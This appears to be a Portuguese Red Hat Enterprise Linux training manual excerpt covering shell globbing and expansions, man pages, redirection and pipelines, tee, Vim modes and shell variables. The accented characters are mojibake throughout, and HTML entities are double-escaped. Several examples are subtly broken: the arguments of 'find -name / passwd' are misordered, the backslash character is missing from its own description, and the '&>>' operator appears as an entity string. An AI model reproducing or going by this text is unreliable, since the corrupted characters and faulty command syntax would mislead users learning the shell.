[user@host ~]$ ln -s /etc /home/user/configfiles [user@host ~]$ cd /home/user/configfiles [user@host configfiles]$ pwd /home/user/configfiles Correspond√™ncia de nomes de arquivos com expans√µes de shell O shell Bash apresenta v√°rias maneiras de expandir uma linha de comando, incluindo a correspond√™ncia de padr√µes, a expans√£o de diret√≥rio pessoal, a expans√£o de string e a substitui√ß√£o de vari√°vel. Talvez a mais poderosa delas seja a capacidade de correspond√™ncia de nome de caminhos, historicamente chamada de globbing. O recurso de globbing do Bash, por vezes chamado de ‚Äúwildcards‚Äù, facilita o gerenciamento de grandes n√∫meros de arquivos. Ao usar metacaracteres que se ‚Äúexpandem‚Äù para corresponder a nomes de caminho e de arquivo que s√£o procurados, os comandos s√£o executados em um conjunto espec√≠fico de arquivos de uma s√≥ vez.
Correspond√™ncia de padr√µes
Globbing √© uma opera√ß√£o de an√°lise de comandos do shell que expande um padr√£o de caracteres curinga em uma lista de nomes de caminho correspondentes. Metacaracteres de linha de comando s√£o substitu√≠dos pela lista de correspond√™ncia antes da execu√ß√£o do comando. Os padr√µes que n√£o retornam correspond√™ncias exibem a solicita√ß√£o de padr√£o original como texto literal. Os itens a seguir s√£o metacaracteres e classes de padr√µes comuns.
Tabela 3.3. Tabela de metacaracteres e correspond√™ncias
* =&amp;gt; Qualquer string com zero ou mais caracteres. ? =&amp;gt; Qualquer caractere √∫nico. [abc...] =&amp;gt; Qualquer caractere na classe entre colchetes. [!abc...] =&amp;gt; Qualquer caractere que n√£o esteja na classe entre colchetes. [^abc...] =&amp;gt; Qualquer caractere que n√£o esteja na classe entre colchetes. [[:alpha:]] =&amp;gt; Qualquer caractere alfab√©tico. [[:lower:]] =&amp;gt; Qualquer caractere em min√∫sculas. [[:upper:]] =&amp;gt; Qualquer caractere em mai√∫sculas. [[:alnum:]] =&amp;gt; Qualquer caractere alfab√©tico ou num√©rico. [[:punct:]] =&amp;gt; Qualquer caractere imprim√≠vel que n√£o seja alfanum√©rico nem um espa√ßo. [[:digit:]] =&amp;gt; Qualquer d√≠gito √∫nico de 0 a 9. [[:space:]] =&amp;gt; Qualquer caractere de espa√ßo √∫nico. Isso pode incluir recuos, novas linhas, retornos, avan√ßos de p√°gina ou espa√ßos. Para os pr√≥ximos exemplos, digamos que voc√™ executou os comandos a seguir para criar alguns arquivos de amostra.
[user@host ~]$ mkdir glob; cd glob [user@host glob]$ touch alfa bravo charlie delta echo able baker cast dog easy [user@host glob]$ ls able alfa baker bravo cast charlie delta dog easy echo [user@host glob]$ O primeiro exemplo usar√° combina√ß√µes de padr√£o simples com os caracteres asterisco * e ponto de interroga√ß√£o &amp;lsquo;?&amp;rsquo; e uma classe de caracteres para corresponder a alguns desses nomes de arquivo.
Expans√£o de til O caractere til &amp;lsquo;~&amp;rsquo; corresponde ao diret√≥rio pessoal do usu√°rio atual. Se uma string diferente de uma barra &amp;lsquo;/&amp;rsquo; for iniciada, o shell interpretar√° a string at√© essa barra como um nome de usu√°rio, se houver uma correspond√™ncia, e substituir√° a cadeia pelo caminho absoluto para o diret√≥rio pessoal desse usu√°rio. Se nenhum nome de usu√°rio for correspondente, um til real seguido da string ser√° usado.
No exemplo a seguir, o comando echo √© usado para exibir o valor do caractere til. O comando echo tamb√©m pode ser usado para exibir os valores de chaves e caracteres de expans√£o de vari√°veis, entre outros.
[user@host glob]$ echo ~root /root [user@host glob]$ echo ~user /home/user [user@host glob]$ echo ~/glob /home/user/glob [user@host glob]$ Expans√£o de chave A expans√£o de chave √© usada para gerar strings de caracteres distintas. As chaves cont√™m uma lista de strings separadas por v√≠rgula ou uma express√£o de sequ√™ncia. O resultado inclui o texto anterior ou o posterior √† defini√ß√£o de chave. As expans√µes de chave podem ser aninhadas uma dentro da outra. Al√©m disso, a sintaxe de dois pontos (..) √© expandida para uma sequ√™ncia tal que {m..p} ser√° expandido para m n o p.
[user@host glob]$ echo {Sunday,Monday,Tuesday,Wednesday}.log Sunday.log Monday.log Tuesday.log Wednesday.log [user@host glob]$ echo file{1..3}.txt file1.txt file2.txt file3.txt [user@host glob]$ echo file{a..c}.txt filea.txt fileb.txt filec.txt [user@host glob]$ echo file{a,b}{1,2}.txt filea1.txt filea2.txt fileb1.txt fileb2.txt [user@host glob]$ echo file{a{1,2},b,c}.txt filea1.txt filea2.txt fileb.txt filec.txt [user@host glob]$ Um uso pr√°tico da expans√£o de chaves √© criar rapidamente v√°rios arquivos ou diret√≥rios.
[user@host glob]$ mkdir ../RHEL{6,7,8} [user@host glob]$ ls ../RHEL* RHEL6 RHEL7 RHEL8 [user@host glob]$ Expans√£o vari√°vel Uma vari√°vel age como um cont√™iner nomeado que pode armazenar um valor na mem√≥ria. As vari√°veis facilitam o acesso e modificam os dados armazenados a partir da linha de comando ou dentro de um script de shell.
Voc√™ pode atribuir dados como um valor a uma vari√°vel usando a seguinte sintaxe:
[user@host ~]$ VARIABLENAME=value Voc√™ pode usar a expans√£o vari√°vel para converter o nome da vari√°vel para o valor na linha de comando. Se uma string come√ßar com um cifr√£o ($), o shell tentar√° usar o restante dessa cadeia como um nome de vari√°vel e o substituir√° por qualquer valor que a vari√°vel tenha.
[user@host ~]$ USERNAME=operator [user@host ~]$ echo $USERNAME operator Para ajudar a evitar erros devido a outras expans√µes de shell, voc√™ pode colocar o nome da vari√°vel entre chaves, por exemplo ${VARIABLENAME} .
[user@host ~]$ USERNAME=operator [user@host ~]$ echo ${USERNAME} operator As vari√°veis do shell e as formas de us√°-las ser√£o abordadas com mais profundidade posteriormente neste curso.
Substitui√ß√£o de comandos A substitui√ß√£o de comandos permite que a sa√≠da de um comando substitua o pr√≥prio comando. A substitui√ß√£o de comandos ocorre quando um comando √© colocado entre par√™nteses e precedido por um cifr√£o ($). A forma $(command) pode aninhar v√°rias expans√µes de comandos, uma dentro da outra.
[user@host glob]$ echo Today is $(date &#43;%A). Today is Wednesday. [user@host glob]$ echo The time is $(date &#43;%M) minutes past $(date &#43;%l%p). The time is 26 minutes past 11AM. [user@host glob]$ Prote√ß√£o de argumentos da expans√£o V√°rios caracteres t√™m significado especial no shell Bash. Para evitar que o shell execute expans√µes de shell em partes de sua linha de comando, voc√™ pode usar aspas e escapes em caracteres e strings.
A barra invertida () √© um caractere de escape no shell Bash. Ela proteger√° contra expans√£o o caractere que vem imediatamente depois.
[user@host glob]$ echo The value of $HOME is your home directory. The value of /home/user is your home directory. [user@host glob]$ echo The value of \$HOME is your home directory. The value of $HOME is your home directory. [user@host glob]$ No exemplo anterior, proteger o cifr√£o de expans√£o fez com que o Bash o tratasse como um caractere regular e n√£o executou a expans√£o de vari√°vel em $HOME .
Para proteger strings mais longas, aspas simples (&amp;rsquo;) ou duplas (&amp;quot;) s√£o usadas para delimitar strings. Elas t√™m efeitos ligeiramente diferentes. As aspas simples param toda a expans√£o do shell. As aspas duplas param a maior parte da expans√£o do shell.
Use aspas duplas para suprimir globbing e a expans√£o do shell, mas ainda permitir substitui√ß√£o de comandos e de vari√°veis.
[user@host glob]$ myhost=$(hostname -s); echo $myhost host [user@host glob]$ echo &amp;#34;***** hostname is ${myhost} *****&amp;#34; ***** hostname is host ***** [user@host glob]$ Use aspas simples para interpretar todo o texto literalmente.
[user@host glob]$ echo &amp;#34;Will variable $myhost evaluate to $(hostname -s)?&amp;#34; Will variable host evaluate to host? [user@host glob]$ echo &amp;#39;Will variable $myhost evaluate to $(hostname -s)?&amp;#39; Will variable $myhost evaluate to $(hostname -s)? [user@host glob]$ Neste cap√≠tulo, voc√™ aprendeu que:
Os arquivos em um sistema Linux s√£o organizados em uma √∫nica √°rvore de diret√≥rio invertida, conhecida como hierarquia do sistema de arquivos.
Os caminhos absolutos come√ßam com um / e especificam a localiza√ß√£o de um arquivo na hierarquia do sistema de arquivos.
Os caminhos relativos n√£o come√ßam com um / e especificam a localiza√ß√£o de um arquivo em rela√ß√£o ao diret√≥rio de trabalho atual.
Cinco comandos principais s√£o usados para gerenciar arquivos: mkdir , rmdir , cp , mv e rm .
Os links f√≠sicos e os links simb√≥licos s√£o maneiras diferentes de ter v√°rios nomes de arquivos apontando para os mesmos dados.
O shell Bash fornece recursos de correspond√™ncia, expans√£o e substitui√ß√£o de padr√µes para ajudar voc√™ a executar comandos de maneira eficiente.
Cap√≠tulo 4. Ajuda no Red Hat Enterprise Linux Introdu√ß√£o ao comando man Uma fonte de documenta√ß√£o geralmente dispon√≠vel no sistema local s√£o p√°ginas do manual do sistema ou p√°ginas do man. Essas p√°ginas s√£o enviadas como parte dos pacotes de software para os quais fornecem documenta√ß√£o e podem ser acessadas na linha de comando usando o comando man.
O hist√≥rico Manual do Programador Linux, do qual as p√°ginas do man se originam, era t√£o grande que consistia em v√°rios volumes impressos. Cada se√ß√£o cont√©m informa√ß√µes sobre um determinado t√≥pico.
Comandos de usu√°rio (tanto execut√°veis quanto programas shell)
Chamadas de sistema (rotinas do kernel invocadas a partir do espa√ßo do usu√°rio)
Fun√ß√µes de biblioteca (fornecidas pelas bibliotecas dos programas)
Arquivos especiais (como arquivos de dispositivos)
Formatos de arquivo (para muitos arquivos de configura√ß√£o e estruturas)
Jogos (se√ß√£o hist√≥rica para programas de lazer)
Conven√ß√µes, padr√µes e p√°ginas diversas (protocolos, sistemas de arquivos)
Administra√ß√£o do sistema e comandos com privil√©gios (tarefas de manuten√ß√£o)
API do kernel Linux (chamadas de kernel internas)
Para distinguir nomes de t√≥picos id√™nticos em diferentes se√ß√µes, as refer√™ncias da p√°gina do man incluem o n√∫mero da se√ß√£o entre par√™nteses ap√≥s o t√≥pico. Por exemplo, passwd(1) descreve o comando para alterar senhas, enquanto passwd(5) explica o formato de arquivo /etc/passwd para armazenar contas de usu√°rio locais.
Para ler p√°ginas espec√≠ficas do man, use man topic. O conte√∫do √© exibido em uma tela de cada vez. O comando man pesquisa se√ß√µes do manual em ordem alfanum√©rica. Por exemplo, man passwd exibe passwd(1) por padr√£o. Para exibir o t√≥pico da p√°gina de manual de uma se√ß√£o espec√≠fica, inclua o argumento n√∫mero de se√ß√£o: man 5 passwd exibe passwd(5).
Navegar e pesquisar em p√°ginas de manual A capacidade de fazer pesquisas eficientes por t√≥picos e de navegar pelas p√°ginas do man √© uma habilidade essencial de administra√ß√£o. As ferramentas da GUI facilitam a configura√ß√£o de recursos comuns do sistema, mas usar a interface de linha de comando ainda √© mais eficiente. Para navegar efetivamente pela linha de comando, voc√™ deve ser capaz de encontrar as informa√ß√µes necess√°rias nas p√°ginas de manual.
A seguinte tabela lista comandos b√°sicos de navega√ß√£o ao visualizar p√°ginas do man:
Navega√ß√£o em p√°ginas do man
Barra de espa√ßo Avan√ßar uma tela (para baixo)
PageDown Avan√ßar uma tela (para baixo)
##PageUp Recuar uma tela (para cima)
##Seta para baixo Avan√ßar uma linha (para baixo)
Seta para cima Recuar uma linha (para cima)
D Avan√ßar meia tela (para baixo)
U Recuar meia tela (para cima)
##/string Procurar string avan√ßando (para baixo) na p√°gina do man
N Repetir a pesquisa anterior avan√ßando (para baixo) na p√°gina do man
Shift&#43;N Repetir a pesquisa anterior recuando (para cima) na p√°gina do man
G Acesse o in√≠cio da p√°gina do man.
Shift&#43;G Acesse o final da p√°gina do man.
Q Sair do man e retornar ao prompt de comando do shell
Importante
Durante a realiza√ß√£o de pesquisas, string permite sintaxe com express√µes regulares. Enquanto o texto simples (como passwd) funciona como esperado, as express√µes regulares usam metacaracteres (como $, , . e ^) para uma busca de padr√µes mais sofisticada. Portanto, pesquisas com strings que incluem metacaracteres de express√µes do programa, como make $$$, poder√£o obter resultados inesperados.
Leitura de p√°ginas de manual
Cada t√≥pico √© dividido em v√°rias partes. A maioria dos t√≥picos compartilha os mesmos cabe√ßalhos e √© apresentada na mesma ordem. Normalmente, um t√≥pico n√£o apresenta todos os cabe√ßalhos, porque nem todos os cabe√ßalhos se aplicam a todos os t√≥picos.
Pesquisa por p√°ginas do man usando palavras-chave Uma pesquisa por p√°ginas de manual usando palavras-chave √© realizada com man -k keyword, que exibe uma lista de t√≥picos de p√°ginas de manual correspondentes √†s palavras-chave seguidos de n√∫meros de se√ß√£o.
[student@desktopX ~]$ man -k passwd checkPasswdAccess (3) - query the SELinux policy database in the kernel. chpasswd (8) - update passwords in batch mode ckpasswd (8) - nnrpd password authenticator fgetpwent_r (3) - get passwd file entry reentrantly getpwent_r (3) - get passwd file entry reentrantly ... passwd (1) - update user&amp;#39;s authentication tokens sslpasswd (1ssl) - compute password hashes passwd (5) - password file passwd.nntp (5) - Passwords for connecting to remote NNTP servers passwd2des (3) - RFS password encryption ... Os t√≥picos de administra√ß√£o de sistema populares encontram-se nas se√ß√µes 1 (comandos de usu√°rio), 5 (formatos de arquivos) e 8 (comandos administrativos). Os administradores usando determinadas ferramentas de solu√ß√£o de problemas tamb√©m usam a se√ß√£o 2 (chamadas do sistema). As se√ß√µes restantes s√£o geralmente usadas como refer√™ncia para programadores ou na administra√ß√£o avan√ßada.
Nota
As pesquisas usando palavras-chave se baseiam em um √≠ndice gerado pelo comando mandb(8), que deve ser executado como root. O comando √© executado diariamente por cron.daily ou por anacrontab em at√© uma hora ap√≥s a inicializa√ß√£o do sistema se ele estiver desatualizado.
Importante
O comando man -K (mai√∫scula) executa uma pesquisa de texto completo nas p√°ginas, n√£o apenas de t√≠tulos e descri√ß√µes, como a op√ß√£o -k. Uma pesquisa de texto completo usa mais recursos do sistema e leva mais tempo.
Cap√≠tulo 5. Cria√ß√£o, visualiza√ß√£o e edi√ß√£o de arquivos de texto Entrada padr√£o, sa√≠da padr√£o e erro padr√£o Um programa, ou um processo, em execu√ß√£o precisa ler a entrada de algum lugar e gravar a sa√≠da em algum lugar. Um comando executado no prompt do shell normalmente l√™ a entrada no teclado e envia a sa√≠da para a janela de terminal.
Um processo usa v√°rios canais chamados descritores de arquivos para obter a entrada e enviar a sa√≠da. Todos os processos come√ßam com pelo menos tr√™s descritores de arquivos. A entrada padr√£o (canal 0) l√™ a entrada do teclado. A sa√≠da padr√£o (canal 1) envia a sa√≠da normal para o terminal. O erro padr√£o (canal 2) envia mensagens de erro para o terminal. Se um programa abrir conex√µes separadas para outros arquivos, ele poder√° usar descritores de arquivo de numera√ß√£o mais alta.
Redirecionamento da sa√≠da para um arquivo O redirecionamento E/S muda como o processo obt√©m sua entrada ou sa√≠da. Em vez de obter entrada do teclado ou enviar sa√≠da e erros para o terminal, o processo l√™ ou grava em arquivos. O redirecionamento permite salvar mensagens em um arquivo que normalmente √© enviado para a janela de terminal. Como alternativa, voc√™ pode usar o redirecionamento para descartar a sa√≠da ou os erros, para que eles n√£o sejam exibidos no terminal nem salvos.
Redirecionar stdout impede que a sa√≠da do processo apare√ßa no terminal. Conforme mostrado na tabela a seguir, redirecionar somente stdout n√£o exclui a exibi√ß√£o de mensagens de erro stderr no terminal. Se o arquivo n√£o existir, ele ser√° criado. Se o arquivo existir e o redirecionamento n√£o for o anexado ao arquivo, o conte√∫do do arquivo ser√° substitu√≠do.
Se voc√™ desejar descartar mensagens, o arquivo especial /dev/null descarta sa√≠da de canal redirecionada a ele e √© sempre um arquivo vazio.
Importante
A ordem das opera√ß√µes de redirecionamento √© importante. A sequ√™ncia a seguir redireciona a sa√≠da padr√£o para file, e depois o erro padr√£o para o mesmo local da sa√≠da padr√£o (file).
&amp;gt; file 2&amp;gt;&amp;amp;1 No entanto, a sequ√™ncia seguinte faz o redirecionamento na ordem oposta. Isso redireciona o erro padr√£o ao local padr√£o da sa√≠da padr√£o (a janela de terminal, portanto n√£o h√° mudan√ßas) e depois apenas redireciona a sa√≠da padr√£o para file.
2&amp;gt;&amp;amp;1 &amp;gt; file Devido a isso, alguns preferem usar os operadores de fus√£o de redirecionamento:
No entanto, outros administradores de sistema e programadores que tamb√©m usam outros shells relacionados ao bash (conhecidos como shells compat√≠veis com Bourne) para comandos de script pensam que os operadores de fus√£o de redirecionamento mais recentes devem ser evitados, pois n√£o s√£o padronizados nem implementados em todos os shells e t√™m outras limita√ß√µes.
Os autores deste curso t√™m uma posi√ß√£o neutra sobre o tema; ambas as sintaxes podem ser encontradas no campo.
Exemplos de redirecionamento de sa√≠da Diversas tarefas de administra√ß√£o de rotina s√£o simplificadas atrav√©s do redirecionamento. Use a tabela anterior como aux√≠lio ao considerar os seguintes exemplos:
Salvar um carimbo de data e hora para refer√™ncia futura. [user@host ~]$ date &amp;gt; /tmp/saved-timestamp Copiar as √∫ltimas 100 linhas de um arquivo de log para outro arquivo. [user@host ~]$ tail -n 100 /var/log/dmesg &amp;gt; /tmp/last-100-boot-messages Concatenar quatro arquivos em um. [user@host ~]$ cat file1 file2 file3 file4 &amp;gt; /tmp/all-four-in-one Listar somente os nomes de arquivos regulares e ocultos do diret√≥rio pessoal em um arquivo. [user@host ~]$ ls -a &amp;gt; /tmp/my-file-names Acrescentar a sa√≠da a um arquivo existente. [user@host ~]$ echo &amp;#34;new line of information&amp;#34; &amp;gt;&amp;gt; /tmp/many-lines-of-information [user@host ~]$ diff previous-file current-file &amp;gt;&amp;gt; /tmp/tracking-changes-made Os pr√≥ximos comandos geram mensagens de erro, porque alguns diret√≥rios do sistema est√£o inacess√≠veis para usu√°rios normais. Observe como as mensagens de erro s√£o redirecionadas. Redirecionar erros para um arquivo enquanto visualiza a sa√≠da normal do comando no terminal. [user@host ~]$ find /etc -name passwd 2&amp;gt; /tmp/errors Salvar a sa√≠da de processos e as mensagens de erro em arquivos separados. [user@host ~]$ find /etc -name passwd &amp;gt; /tmp/output 2&amp;gt; /tmp/errors Ignorar e descartar mensagens de erro. [user@host ~]$ find /etc -name passwd &amp;gt; /tmp/output 2&amp;gt; /dev/null Armazenar em conjunto a sa√≠da e os erros gerados. [user@host ~]$ find /etc -name passwd &amp;amp;&amp;gt; /tmp/save-both Acrescentar a sa√≠da e os erros gerados a um arquivo existente. [user@host ~]$ find /etc -name passwd &amp;gt;&amp;gt; /tmp/save-both 2&amp;gt;&amp;amp;1 Constru√ß√£o de pipelines Um pipeline √© uma sequ√™ncia de um ou mais comandos separados por pipe, o caractere (|). Um pipe conecta a sa√≠da padr√£o do primeiro comando √† entrada padr√£o do comando seguinte.
Pipelines permitem que a sa√≠da de um processo seja manipulada e formatada por outros processos antes de sua sa√≠da para o terminal. Uma imagem mental √∫til √© imaginar que os dados &amp;ldquo;fluem&amp;rdquo; pelo pipeline de um processo a outro, sendo levemente alterados a cada comando no pipeline em que passam.
obs: Pipelines e redirecionamento de E/S manipulam a sa√≠da padr√£o e a entrada padr√£o. O redirecionamento envia a sa√≠da padr√£o para arquivos ou recebe deles a entrada padr√£o. Pipes enviam a sa√≠da padr√£o de um processo para a entrada padr√£o de outro processo.
Exemplos de pipeline
Este exemplo utiliza a sa√≠da do comando ls e usa less para exibi-la no terminal uma tela por vez.
[user@host ~]$ ls -l /usr/bin | less A sa√≠da do comando ls √© enviada para wc -l, que conta o n√∫mero de linhas recebidas de ls e o imprime no terminal.
[user@host ~]$ ls | wc -l Neste pipeline, head ter√° como sa√≠da as 10 primeiras linhas da sa√≠da de ls -t, com o resultado final redirecionado para um arquivo.
[user@host ~]$ ls -t | head -n 10 &amp;gt; /tmp/ten-last-changed-files Pipelines, redirecionamento e o comando tee Quando o redirecionamento √© combinado com um pipeline, o shell configura todo o pipeline primeiro e depois redireciona input/output. Se o redirecionamento de sa√≠da for usado no meio de um pipeline, a sa√≠da ir√° para o arquivo e n√£o para o pr√≥ximo comando no pipeline.
Neste exemplo, a sa√≠da do comando ls ir√° para o arquivo, e less n√£o exibir√° resultados no terminal.
[user@host ~]$ ls &amp;gt; /tmp/saved-output | less O comando tee supera essa limita√ß√£o. Em um pipeline, tee copia sua entrada padr√£o para a sa√≠da padr√£o e tamb√©m redireciona a sa√≠da padr√£o para os arquivos nomeados como argumentos do comando. Se voc√™ imaginar os dados como √°gua fluindo atrav√©s de uma tubula√ß√£o, o tee pode ser visualizado como uma jun√ß√£o &amp;ldquo;T&amp;rdquo; no tubo, que direciona a sa√≠da em duas dire√ß√µes.
Exemplos de pipeline usando o comando tee Este exemplo redireciona a sa√≠da do comando ls para o arquivo e passa-o a less para exibi√ß√£o no terminal, uma tela por vez.
[user@host ~]$ ls -l | tee /tmp/saved-output | less Se tee for usado no fim de um pipeline, a sa√≠da final de um comando poder√° ser salva e enviada ao terminal ao mesmo tempo.
[user@host ~]$ ls -t | head -n 10 | tee /tmp/ten-last-changed-files Importante √â poss√≠vel redirecionar o erro padr√£o atrav√©s de um pipe, mas os operadores de fus√£o de redirecionamento (&amp;amp;&amp;gt; e &amp;amp;&amp;raquo;) n√£o podem ser usados para fazer isso.
Esta √© a maneira correta de redirecionar tanto a sa√≠da padr√£o quanto o erro padr√£o atrav√©s de um pipe:
[user@host ~]$ find -name / passwd 2&amp;gt;&amp;amp;1 | less Edi√ß√£o de arquivos de texto a partir do prompt do shell Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de criar e editar arquivos de texto a partir da linha de comando usando o editor vim. Edi√ß√£o de arquivos com o Vim
Um princ√≠pio de design essencial no Linux √© que as informa√ß√µes e as defini√ß√µes de configura√ß√£o s√£o normalmente armazenadas em arquivos de texto. Esses arquivos podem ser estruturados de v√°rias maneiras, como listas de configura√ß√µes, em formatos semelhantes a INI, como XML estruturado ou YAML, e assim por diante. No entanto, a vantagem dos arquivos de texto √© que eles podem ser visualizados e editados usando qualquer editor de texto simples.
O Vim √© uma vers√£o melhorada do editor vi distribu√≠do com sistemas Linux e UNIX. O Vim √© altamente configur√°vel e eficiente para usu√°rios experientes, incluindo recursos como edi√ß√£o em janela dividida, formata√ß√£o em cores e destaque para edi√ß√£o de texto.
Por que saber usar o Vim? Voc√™ deve saber usar pelo menos um editor de texto que pode ser usado em um prompt do shell de somente texto. Se souber, poder√° editar arquivos de configura√ß√£o de texto de uma janela de terminal ou de logins remotos com o ssh ou o console da web. Dessa forma, n√£o √© necess√°rio acessar uma √°rea de trabalho gr√°fica para editar arquivos em um servidor, e esse servidor pode n√£o precisar executar um ambiente gr√°fico de √°rea de trabalho.
Ent√£o por que aprender Vim em vez de outras op√ß√µes poss√≠veis? A principal raz√£o √© que o Vim est√° quase sempre instalado em um servidor se houver algum editor de texto presente. O motivo √© que vi foi especificado pelo padr√£o POSIX que o Linux e muitos outros sistemas operacionais semelhantes a UNIX cumprem em grande parte.
Al√©m disso, o Vim √© frequentemente usado como implementa√ß√£o do vi em outros sistemas operacionais ou distribui√ß√µes comuns. Por exemplo, o macOS atualmente inclui uma instala√ß√£o leve do Vim por padr√£o. Por isso, as habilidades do Vim aprendidas para o Linux tamb√©m podem ajudar voc√™ realizar tarefas em outros lugares.
Inicializa√ß√£o do Vim O Vim pode estar instalado no Red Hat Enterprise Linux de duas maneiras diferentes. Elas podem afetar os recursos e os comandos do Vim dispon√≠veis para voc√™.
Seu servidor pode ter apenas o pacote vim-minimal instalado. Essa √© uma instala√ß√£o muito leve que inclui apenas o conjunto de recursos principais e o comando vi. Nesse caso, voc√™ pode abrir um arquivo para edi√ß√£o com vi filename, e todos os principais recursos discutidos nesta se√ß√£o estar√£o dispon√≠veis para voc√™.
Como alternativa, seu servidor pode ter o pacote vim-enhanced instalado. Ele fornece um conjunto muito mais abrangente de recursos, um sistema on-line de ajuda e um programa de tutorial. Para iniciar o Vim nesse modo avan√ßado, voc√™ usa o comando vim.
[user@host ~]$ vim filename Nos dois modos, os principais recursos que discutiremos nesta se√ß√£o funcionar√£o com os dois comandos. Nota
Se vim-enhanced estiver instalado, os usu√°rios regulares ter√£o um conjunto de alias de shell para que, se executarem o comando vi, recebam automaticamente o comando vim no lugar. Isso n√£o se aplica ao root e aos outros usu√°rios com UIDs abaixo de 200 (que s√£o usados pelos servi√ßos do sistema).
Se voc√™ estiver editando arquivos como o usu√°rio root e esperar que o vi seja executado no modo avan√ßado, isso poder√° ser uma surpresa. Da mesma forma, se vim-enhanced estiver instalado e um usu√°rio regular desejar usar o vi simples por algum motivo, ele poder√° precisar usar o \vi para substituir o alias temporariamente.
Os usu√°rios avan√ßados podem usar \vi &amp;ndash;version e vim &amp;ndash;version para comparar os conjuntos de recursos dos dois comandos.
Modos de opera√ß√£o do Vim Uma caracter√≠stica incomum do Vim √© que ele tem v√°rios modos de opera√ß√£o, incluindo modo de comando, modo de comando estendido, modo de edi√ß√£o e modo visual. Dependendo do modo, voc√™ pode emitir comandos, editar texto ou trabalhar com blocos de texto. Como um novo usu√°rio do Vim, voc√™ deve sempre estar ciente de seu modo atual, pois as teclas t√™m diferentes efeitos em diferentes modos.
Figura 5.10: Altern√¢ncia entre modos do Vim
Quando voc√™ abre o Vim pela primeira vez, ele √© iniciado em Modo de comando, que √© usado para navega√ß√£o, opera√ß√µes de cortar e colar e manipula√ß√£o de texto. Digite os outros modos com pressionamentos de teclas individuais para acessar a funcionalidade de edi√ß√£o espec√≠fica:
O atalho de teclado i entra no modo de inser√ß√£o, em que todo o texto digitado se torna conte√∫do do arquivo. Pressionar Esc retorna para o modo de comando. O atalho de teclado v entra no modo visual, em que v√°rios caracteres podem ser selecionados para manipula√ß√£o de texto. Use Shift&#43;V para sele√ß√£o de v√°rias linhas e Ctrl&#43;V para sele√ß√£o em bloco. O mesmo atalho de teclado usado para entrar no modo visual (v, Shift&#43;V ou Ctrl&#43;V) √© usado para sair dele. O atalho de teclado : inicia o modo de comando estendido para tarefas como gravar o arquivo (para salv√°-lo) ou sair do editor do Vim. Nota Se voc√™ n√£o tiver certeza do modo do Vim em que est√°, poder√° pressionar Esc algumas vezes para voltar ao modo de comando. A tecla Esc n√£o tem nenhum efeito no modo de comando, por isso n√£o h√° problema em pressionar algumas vezes a mais.
O fluxo de trabalho m√≠nimo e b√°sico do Vim
O Vim tem atalhos de teclado eficientes e coordenados para tarefas de edi√ß√£o avan√ßadas. Embora se tornem muito √∫teis com a pr√°tica, os recursos do Vim podem sobrecarregar novos usu√°rios.
A tecla i coloca o Vim no modo de inser√ß√£o. Todo o texto digitado depois disso √© tratado como conte√∫do do arquivo at√© que voc√™ saia do modo de inser√ß√£o. A tecla Esc sai do modo de inser√ß√£o e retorna o Vim para o modo de comando. A tecla u desfaz a edi√ß√£o mais recente. Pressione a tecla x para excluir um √∫nico caractere. O comando :w grava (salva) o arquivo e permanece no modo de comando para continuar editando. O comando :wq grava (salva) o arquivo e sai do Vim. O comando :q! sai do Vim, descartando todas as altera√ß√µes no arquivo desde a √∫ltima grava√ß√£o. O usu√°rio do Vim deve aprender esses comandos para realizar qualquer tarefa de edi√ß√£o.
Reorganiza√ß√£o do texto existente No Vim, copiar e colar s√£o conhecidos como yank e put e usam os caracteres de comando y e p. Comece posicionando o cursor no primeiro caractere a ser selecionado e entre no visual. Use as teclas de seta para expandir a sele√ß√£o visual. Quando estiver pronto, pressione y para copiar (yank) a sele√ß√£o para a mem√≥ria. Posicione o cursor no local novo e pressione p para colocar a sele√ß√£o no cursor.
Modo visual no Vim O modo visual √© uma √≥tima maneira de destacar e manipular texto. Existem tr√™s atalhos de teclado:
Modo de caractere: v Modo de linha: Shift&#43;v Modo de bloqueio: Ctrl&#43;v O modo de caractere destaca frases em um bloco de texto. A palavra VISUAL aparecer√° na parte inferior da tela. Pressione v para entrar no modo de caracteres visuais. Shift&#43;v entra no modo de linha. VISUAL LINE aparecer√° na parte inferior da tela.
O modo de bloqueio visual √© perfeito para manipular arquivos de dados. A partir do cursor, pressione Ctrl&#43;v para entrar no bloco visual. VISUAL BLOCK aparecer√° na parte inferior da tela. Use as teclas de seta para real√ßar a se√ß√£o a ser alterada. Nota
O Vim tem muitos recursos, mas voc√™ deve dominar o fluxo de trabalho b√°sico primeiro. Voc√™ n√£o precisa entender rapidamente todo o editor e seus recursos. Sinta-se confort√°vel com esses conceitos b√°sicos atrav√©s da pr√°tica e, depois, voc√™ poder√° expandir seu vocabul√°rio sobre o Vim aprendendo comandos adicionais do Vim (atalhos do teclado).
O exerc√≠cio desta se√ß√£o apresentar√° voc√™ ao comando vimtutor. Este tutorial, que vem com o vim-enhanced, √© uma excelente maneira de aprender a funcionalidade principal do Vim.
Altera√ß√£o do ambiente do shell Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de definir vari√°veis de shell para ajudar a executar comandos e editar scripts de inicializa√ß√£o Bash para definir vari√°veis de shell e de ambiente a fim de modificar o comportamento do shell e os programas executados a partir dele. Uso de vari√°veis de shell
O shell Bash permite que voc√™ defina vari√°veis de shell que pode usar para ajudar a executar comandos ou modificar o comportamento do shell. Voc√™ tamb√©m pode exportar vari√°veis de shell como vari√°veis de ambiente, que s√£o automaticamente copiadas para programas executados a partir desse shell quando iniciados. Voc√™ pode usar vari√°veis para facilitar a execu√ß√£o de um comando com um argumento longo ou para aplicar uma configura√ß√£o comum aos comandos executados a partir desse shell.
As vari√°veis do shell s√£o exclusivas de uma sess√£o de shell espec√≠fica. Se voc√™ tiver duas janelas de terminal abertas ou duas sess√µes de login independentes para o mesmo servidor remoto, voc√™ est√° executando dois shells. Cada shell tem seu pr√≥prio conjunto de valores para suas vari√°veis do shell.
Atribui√ß√£o de valores a vari√°veis Atribua um valor a uma vari√°vel de shell usando a seguinte sintaxe:
VARIABLENAME=value Os nomes das vari√°veis podem conter letras mai√∫sculas ou min√∫sculas, d√≠gitos e o caractere de sublinhado (_). Por exemplo, os seguintes comandos definem as vari√°veis de shell:
[user@host ~]$ COUNT=40 [user@host ~]$ first_name=John [user@host ~]$ file1=/tmp/abc [user@host ~]$ _ID=RH123 Lembre-se, essa altera√ß√£o afeta apenas o shell no qual voc√™ executa o comando, e nenhum outro shell que voc√™ esteja executando nesse servidor.
